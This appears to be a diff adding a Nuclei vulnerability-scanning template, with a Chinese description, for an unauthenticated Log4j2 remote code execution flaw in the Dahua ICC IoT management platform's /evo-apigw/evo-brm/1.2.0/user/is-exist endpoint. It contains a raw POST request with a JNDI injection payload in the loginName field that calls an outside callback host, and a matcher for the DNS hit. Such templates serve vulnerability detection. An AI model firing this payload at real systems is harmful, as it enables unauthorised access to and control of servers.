@@ -1,0 +1,27 @@
+id: dahua-random-log4j-rce
+info:
+  name: "大华智能物联综合管理平台 is-exist接口Log4j2远程代码执行漏洞"
+  author: Unknown
+  severity: critical
+  description: 大华ICC智能物联综合管理平台在/evo-apigw/evo-brm/1.2.0/user/is-exist接口处存在Log4j2远程代码执行漏洞。攻击者可通过构造恶意请求触发Log4j2远程代码执行漏洞，从而在目标系统上执行任意代码，最终实现对服务器的控制。该漏洞利用无需身份验证即可完成，攻击者可借此构建系统级利用链实现持久化控制。
+  tags: 大华智能物联综合管理平台
+
+http:
+- raw:
+  - |
+    POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    Content-Type: application/json;charset=utf-8
+
+    {"loginName":"${jndi:ldap://{{interactsh-url}}}"}
+
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
+
+
+
+
